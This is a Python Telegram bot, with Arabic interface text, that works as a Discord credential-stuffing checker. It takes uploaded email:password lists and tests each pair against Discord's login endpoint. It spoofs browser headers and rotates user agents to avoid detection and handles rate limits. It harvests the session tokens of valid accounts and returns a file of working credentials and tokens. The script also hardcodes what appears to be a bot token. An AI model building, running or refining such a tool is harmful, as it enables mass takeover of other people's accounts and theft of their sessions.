import asyncio
import base64
import json
import os
import random
import time
from datetime import datetime
from typing import List, Dict, Tuple, Optional

import aiofiles
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ============= إعدادات البوت =============
BOT_TOKEN = "8818745155:AAFNGU9SIbkKxzcZN62khYE-zAqiUDEUaSw"
ADMIN_IDS = [8703458182]

# ============= القيم الثابتة =============
X_SUPER_PROPERTIES = {
    "os": "Windows",
    "browser": "Chrome",
    "device": "",
    "system_locale": "en-US",
    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "browser_version": "135.0.0.0",
    "os_version": "10",
    "referrer": "",
    "referring_domain": "",
    "referrer_current": "",
    "referring_domain_current": "",
    "release_channel": "stable",
    "client_build_number": 999999,
    "client_event_source": None
}

# ============= دالة التحقق من الأدمن =============
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# ============= كلاس المفحص =============
class DiscordChecker:
    def __init__(self):
        self.results: List[Dict] = []
        self.total = 0
        self.processed = 0
        self.valid = 0
        self.invalid = 0
        self.start_time = None
        self.is_running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        ]
        
    def get_headers(self) -> dict:
        user_agent = random.choice(self.user_agents)
        x_super = base64.b64encode(json.dumps(X_SUPER_PROPERTIES, separators=(',', ':')).encode()).decode()
        return {
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
            'X-Super-Properties': x_super,
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'Sec-Ch-Ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

    async def check_account(
        self,
        session: aiohttp.ClientSession,
        email: str,
        password: str,
        retry_count: int = 0
    ) -> Tuple[bool, Optional[str], str, str]:
        """
        Returns: (is_valid, token_or_none, status_text, emoji)
        """
        try:
            if retry_count > 0:
                wait = min(2 ** retry_count, 60)
                await asyncio.sleep(wait)

            payload = json.dumps({
                "login": email,
                "password": password,
                "undelete": False,
                "login_source": None,
                "gift_code_sku_id": None
            }, separators=(',', ':'))

            headers = self.get_headers()

            async with session.post(
                "https://discord.com/api/v9/auth/login",
                data=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                try:
                    data = await resp.json()
                except Exception:
                    text = await resp.text()
                    return False, None, f"Invalid JSON: {text[:60]}", "❌"

                # ─── Rate Limit ───
                if resp.status == 429 or 'retry_after' in data:
                    retry_after = data.get('retry_after', 2 ** retry_count)
                    if retry_count < 5:
                        await asyncio.sleep(min(float(retry_after), 60))
                        return await self.check_account(session, email, password, retry_count + 1)
                    return False, None, f"Rate Limited ({retry_after}s)", "⛔"

                # ─── Captcha ───
                if 'captcha_key' in data or 'captcha_sitekey' in data:
                    return False, None, "Captcha Required", "🤖"

                # ─── Token موجود → نجاح تام ───
                if 'token' in data and data['token']:
                    return True, data['token'], "Valid Token", "✅"

                # ─── Ticket → 2FA Required ───
                if 'ticket' in data and data['ticket']:
                    return False, None, "2FA Required", "🔐"

                # ─── New Login Location Detected ───
                # ديسكورد يرجع user_id بدون token وبدون ticket لما يكون
                # الإيميل/الباس صحيح لكن IP/موقع جديد يحتاج تأكيد إيميل
                if 'user_id' in data and not data.get('token') and not data.get('ticket'):
                    # الحساب صحيح لكن يحتاج تأكيد من الإيميل
                    # نحاول نستخرج أي token إذا كان مخفي أو نعتبره صحيح
                    uid = data.get('user_id', 'unknown')
                    return True, None, f"New Location (Verify Email) | UID: {uid}", "📧"

                # ─── MFA/TOTP specific responses ───
                if data.get('mfa') is True or data.get('sms') is True:
                    return False, None, "2FA/MFA Required", "🔐"

                # ─── Errors ───
                if 'errors' in data:
                    errors = data['errors']
                    if 'login' in errors:
                        login_errs = errors['login']
                        if '_errors' in login_errs:
                            code = login_errs['_errors'][0].get('code', 'UNKNOWN')
                            if code == "EMAIL_TYPE_INVALID_EMAIL":
                                return False, None, "Invalid Email", "❌"
                            elif code == "INVALID_PASSWORD":
                                return False, None, "Incorrect Password", "❌"
                            elif code == "EMAIL_UNCONFIRMED":
                                return False, None, "Email Not Confirmed", "⚠️"
                            elif code == "ACCOUNT_DISABLED":
                                return False, None, "Account Disabled", "🚫"
                            return False, None, f"Error: {code}", "❌"
                        if '_errors' in errors:
                            code = errors['_errors'][0].get('code', 'UNKNOWN')
                            return False, None, f"Error: {code}", "❌"

                # ─── Message-based errors ───
                if 'message' in data:
                    msg = data['message']
                    if 'Invalid' in msg or 'incorrect' in msg.lower():
                        return False, None, "Invalid Credentials", "❌"
                    if 'captcha' in msg.lower():
                        return False, None, "Captcha Required", "🤖"
                    return False, None, f"Msg: {msg[:50]}", "❌"

                # ─── Code-based errors ───
                if 'code' in data:
                    code = data['code']
                    if code == 50035:
                        return False, None, "Invalid Form Body", "❌"
                    if code == 60008:
                        return False, None, "Invalid 2FA Code", "🔐"

                # ─── أي رد غير متوقع لكن فيه user_id → صحيح ───
                if 'user_id' in data:
                    return True, None, f"Valid (UID: {data['user_id'][:10]}...)", "✅"

                return False, None, f"Unknown: {str(data)[:60]}", "❌"

        except asyncio.TimeoutError:
            if retry_count < 3:
                return await self.check_account(session, email, password, retry_count + 1)
            return False, None, "Timeout", "⏱️"
        except Exception as e:
            return False, None, f"Exception: {str(e)[:50]}", "❌"

    async def process_accounts(
        self,
        accounts: List[Tuple[str, str]],
        progress_callback=None
    ) -> List[Dict]:
        self.is_running = True
        self.start_time = time.time()
        self.total = len(accounts)
        self.processed = 0
        self.valid = 0
        self.invalid = 0
        self.results = []

        connector = aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for idx, (email, password) in enumerate(accounts, 1):
                if not self.is_running:
                    break

                email = email.strip()
                password = password.strip()
                if not email or not password:
                    continue

                # تأخير عشوائي لتجنب Rate Limit
                await asyncio.sleep(random.uniform(0.5, 1.2))

                success, token, status, emoji = await self.check_account(session, email, password)

                result = {
                    'email': email,
                    'password': password,
                    'success': success,
                    'token': token or '',
                    'status': status,
                    'emoji': emoji,
                    'checked_at': datetime.now().isoformat()
                }

                self.results.append(result)
                self.processed += 1
                if success:
                    self.valid += 1
                else:
                    self.invalid += 1

                if progress_callback and (self.processed % 5 == 0 or self.processed == self.total):
                    elapsed = time.time() - self.start_time
                    progress = {
                        'processed': self.processed,
                        'total': self.total,
                        'valid': self.valid,
                        'invalid': self.invalid,
                        'progress_percentage': (self.processed / self.total * 100),
                        'elapsed_time': int(elapsed),
                        'estimated_remaining': int(elapsed / self.processed * (self.total - self.processed)) if self.processed > 0 else 0
                    }
                    try:
                        await progress_callback(progress)
                    except Exception:
                        pass

        self.is_running = False
        return self.results

    def generate_results_file(self, filename: str = None) -> str:
        if not filename:
            filename = f"discord_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("🎮 DISCORD ACCOUNT CHECKER RESULTS\n")
            f.write(f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 70 + "\n\n")

            f.write(f"📊 Total Checked: {self.total}\n")
            f.write(f"✅ Valid Accounts: {self.valid}\n")
            f.write(f"❌ Invalid Accounts: {self.invalid}\n")
            f.write(f"⏱️ Time Taken: {int(time.time() - self.start_time)} seconds\n")
            f.write(f"📈 Success Rate: {(self.valid / self.total * 100):.1f}%\n")
            f.write("=" * 70 + "\n\n")

            if self.valid > 0:
                f.write("✅✅✅ VALID ACCOUNTS ✅✅✅\n")
                f.write("-" * 70 + "\n")
                for idx, r in enumerate(self.results, 1):
                    if r['success']:
                        f.write(f"[{idx}] Email: {r['email']}\n")
                        f.write(f"    Password: {r['password']}\n")
                        f.write(f"    Status: {r['status']}\n")
                        if r['token']:
                            f.write(f"    Token: {r['token']}\n")
                        f.write("-" * 70 + "\n")

            if self.invalid > 0:
                f.write("\n❌❌❌ INVALID ACCOUNTS ❌❌❌\n")
                f.write("-" * 70 + "\n")
                for idx, r in enumerate(self.results, 1):
                    if not r['success']:
                        f.write(f"[{idx}] Email: {r['email']}\n")
                        f.write(f"    Password: {r['password']}\n")
                        f.write(f"    Status: {r['status']}\n")
                        f.write("-" * 70 + "\n")

        return filename


# ============= دوال بوت التيليجرام =============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)

    welcome_msg = (
        "🤖 *Discord Account Checker Bot*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )

    if is_admin_user:
        welcome_msg += (
            "👑 *مرحباً أيها الأدمن!*\n"
            "📤 أرسل لي ملف نصي يحتوي على الحسابات\n"
            "📝 الصيغة: `email:password`\n"
            "📌 كل حساب في سطر منفصل\n\n"
            "📊 سأقوم بفحصهم وإرسال النتائج\n"
            "✅ حسابات صالحة مع التوكن\n"
            "❌ حسابات غير صالحة مع السبب\n\n"
            "⚙️ *أوامر الأدمن:*\n"
            "/stats - إحصائيات البوت\n"
            "/broadcast - إرسال رسالة للجميع\n"
            "/users - قائمة المستخدمين"
        )
    else:
        welcome_msg += (
            "👤 *مرحباً بك!*\n"
            "📤 أرسل لي ملف نصي يحتوي على الحسابات\n"
            "📝 الصيغة: `email:password`\n"
            "📌 كل حساب في سطر منفصل"
        )

    await update.message.reply_text(welcome_msg, parse_mode='Markdown')


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if 'users' not in context.bot_data:
        context.bot_data['users'] = set()
    context.bot_data['users'].add(user_id)

    status_msg = await update.message.reply_text("📥 *جاري معالجة الملف...*", parse_mode='Markdown')
    temp_filename = None
    results_file = None

    try:
        document = update.message.document
        if not document:
            await status_msg.edit_text("❌ *لم يتم العثور على ملف!*", parse_mode='Markdown')
            return

        file_name = document.file_name or "unknown.txt"
        if not file_name.lower().endswith(('.txt', '.csv')):
            await status_msg.edit_text(
                f"❌ *نوع الملف غير مدعوم!*\n"
                f"📝 الملف: `{file_name}`\n"
                f"✅ المدعوم: `.txt`, `.csv`",
                parse_mode='Markdown'
            )
            return

        file_size = document.file_size or 0
        if file_size > 10 * 1024 * 1024:
            await status_msg.edit_text(
                f"❌ *الملف كبير جداً!*\n📊 `{file_size / 1024 / 1024:.1f} MB` > `10 MB`",
                parse_mode='Markdown'
            )
            return

        if file_size == 0:
            await status_msg.edit_text("❌ *الملف فارغ!*", parse_mode='Markdown')
            return

        # تحميل الملف
        await status_msg.edit_text(f"📥 *جاري تحميل الملف...*\n📊 `{file_size / 1024:.1f} KB`", parse_mode='Markdown')

        temp_filename = f"accounts_{user_id}_{int(time.time())}.txt"

        try:
            file = await context.bot.get_file(document.file_id, read_timeout=60, connect_timeout=30)
            await file.download_to_drive(temp_filename)
        except Exception as e1:
            print(f"Download method 1 failed: {e1}")
            try:
                file = await context.bot.get_file(document.file_id)
                await file.download_to_drive(temp_filename)
            except Exception as e2:
                print(f"Download method 2 failed: {e2}")
                await status_msg.edit_text("❌ *فشل تحميل الملف!* أعد الإرسال.", parse_mode='Markdown')
                return

        if not os.path.exists(temp_filename) or os.path.getsize(temp_filename) == 0:
            await status_msg.edit_text("❌ *الملف فارغ أو تالف!*", parse_mode='Markdown')
            return

        # قراءة الملف
        await status_msg.edit_text("📖 *جاري قراءة الحسابات...*", parse_mode='Markdown')

        async with aiofiles.open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        try:
            os.remove(temp_filename)
            temp_filename = None
        except:
            pass

        # استخراج الحسابات
        accounts = []
        invalid_lines = 0

        for line in content.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            email = password = None
            if ':' in line:
                parts = line.split(':', 1)
                email, password = parts[0].strip(), parts[1].strip()
            elif '|' in line:
                parts = line.split('|', 1)
                email, password = parts[0].strip(), parts[1].strip()

            if email and password and '@' in email and len(password) >= 1:
                accounts.append((email, password))
            else:
                invalid_lines += 1

        if not accounts:
            await status_msg.edit_text(
                f"❌ *لم يتم العثور على حسابات صالحة!*\n\n"
                f"📝 الصيغة: `email:password`\n"
                f"⚠️ أسطر غير صالحة: `{invalid_lines}`",
                parse_mode='Markdown'
            )
            return

        # بدء الفحص
        await status_msg.edit_text(
            f"🚀 *بدأت عملية الفحص!*\n\n"
            f"📊 عدد الحسابات: `{len(accounts)}`\n"
            f"⏳ جاري الفحص...",
            parse_mode='Markdown'
        )

        checker = DiscordChecker()
        last_update_time = 0

        async def send_progress(progress):
            nonlocal last_update_time
            current_time = time.time()
            if current_time - last_update_time >= 10 or progress['processed'] == progress['total']:
                last_update_time = current_time
                em, es = divmod(progress['elapsed_time'], 60)
                rm, rs = divmod(progress['estimated_remaining'], 60)
                msg = (
                    f"📊 *تحديث التقدم*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ تم الفحص: `{progress['processed']}/{progress['total']}`\n"
                    f"🎯 صالحة: `{progress['valid']}`\n"
                    f"❌ غير صالحة: `{progress['invalid']}`\n"
                    f"📈 النسبة: `{progress['progress_percentage']:.1f}%`\n"
                    f"⏱️ الوقت: `{em}m {es}s`\n"
                    f"⏳ متبقي: `~{rm}m {rs}s`"
                )
                await update.message.reply_text(msg, parse_mode='Markdown')

        await checker.process_accounts(accounts, send_progress)

        # توليد ملف النتائج
        results_file = checker.generate_results_file()

        success_rate = (checker.valid / checker.total * 100) if checker.total > 0 else 0
        elapsed = int(time.time() - checker.start_time)

        summary = (
            f"✅ *انتهت عملية الفحص!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 الإجمالي: `{checker.total}`\n"
            f"✅ صالحة: `{checker.valid}`\n"
            f"❌ غير صالحة: `{checker.invalid}`\n"
            f"📈 نسبة النجاح: `{success_rate:.1f}%`\n"
            f"⏱️ الوقت: `{elapsed} ثانية`"
        )

        await update.message.reply_text(summary, parse_mode='Markdown')

        # إرسال الملف
        async with aiofiles.open(results_file, 'rb') as f:
            data = await f.read()
            await update.message.reply_document(
                document=data,
                filename=os.path.basename(results_file),
                caption="📄 *ملف النتائج الكامل*",
                parse_mode='Markdown'
            )

        try:
            os.remove(results_file)
            results_file = None
        except:
            pass

        # إشعار الأدمن
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"👤 مستخدم استخدم البوت:\n"
                    f"🆔 ID: `{user_id}`\n"
                    f"📊 فحص: `{checker.total}` حساب\n"
                    f"✅ صالح: `{checker.valid}`",
                    parse_mode='Markdown'
                )
            except:
                pass

    except Exception as e:
        await status_msg.edit_text(
            f"❌ *حدث خطأ:*\n`{str(e)[:200]}`\n\n"
            f"💡 *حاول إعادة إرسال الملف*",
            parse_mode='Markdown'
        )
        print(f"Error in handle_file: {e}")

    finally:
        if temp_filename and os.path.exists(temp_filename):
            try:
                os.remove(temp_filename)
            except:
                pass
        if results_file and os.path.exists(results_file):
            try:
                os.remove(results_file)
            except:
                pass


# ============= أوامر الأدمن =============

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ *للأدمن فقط!*", parse_mode='Markdown')
        return

    users_count = len(context.bot_data.get('users', set()))
    msg = (
        f"📊 *إحصائيات البوت*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 المستخدمين: `{users_count}`\n"
        f"🆔 الأدمن: `{len(ADMIN_IDS)}`\n"
        f"🤖 الحالة: `🟢 يعمل`\n"
        f"⏰ الوقت: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ *للأدمن فقط!*", parse_mode='Markdown')
        return

    text = update.message.text.replace('/broadcast', '').strip()
    if not text:
        await update.message.reply_text("❌ اكتب الرسالة بعد الأمر\nمثال: `/broadcast مرحباً`", parse_mode='Markdown')
        return

    users = context.bot_data.get('users', set())
    if not users:
        await update.message.reply_text("❌ لا يوجد مستخدمين", parse_mode='Markdown')
        return

    sent = failed = 0
    status = await update.message.reply_text(f"📤 جاري الإرسال لـ `{len(users)}` مستخدم...", parse_mode='Markdown')

    for user in users:
        try:
            await context.bot.send_message(user, f"📢 *إشعار من الأدمن*\n\n{text}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1

    await status.edit_text(f"✅ تم: `{sent}` | ❌ فشل: `{failed}`", parse_mode='Markdown')


async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ *للأدمن فقط!*", parse_mode='Markdown')
        return

    users = context.bot_data.get('users', set())
    if not users:
        await update.message.reply_text("❌ لا يوجد مستخدمين", parse_mode='Markdown')
        return

    users_text = "\n".join([f"🆔 `{u}`" for u in list(users)[:20]])
    msg = f"👥 *المستخدمين* (`{len(users)}`)\n━━━━━━━━━━━━━━━━━━━━━━\n{users_text}"
    if len(users) > 20:
        msg += f"\n\n... و `{len(users) - 20}` آخرين"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⏹️ *تم الإيقاف*", parse_mode='Markdown')


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)

    msg = (
        "📖 *طريقة الاستخدام:*\n\n"
        "1️⃣ أرسل ملف `.txt`\n"
        "2️⃣ كل سطر: `email:password`\n"
        "3️⃣ انتظر النتائج\n\n"
        "📌 *الأوامر:*\n"
        "/start - بدء\n"
        "/stop - إيقاف\n"
        "/help - المساعدة"
    )

    if is_admin_user:
        msg += (
            "\n\n👑 *أوامر الأدمن:*\n"
            "/stats - إحصائيات\n"
            "/broadcast - إرسال للجميع\n"
            "/users - قائمة المستخدمين"
        )

    await update.message.reply_text(msg, parse_mode='Markdown')


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ خطأ: {context.error}")
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                admin_id,
                f"⚠️ *خطأ*\n🆔 `{update.effective_user.id if update else '?'}`\n`{str(context.error)[:200]}`",
                parse_mode='Markdown'
            )
        except:
            pass


# ============= التشغيل الرئيسي =============

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ضع توكن البوت في BOT_TOKEN")
        return

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .read_timeout(60)
        .write_timeout(60)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("users", users_list))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_error_handler(error_handler)

    print("🤖 Bot is running...")
    print(f"👑 Admins: {ADMIN_IDS}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
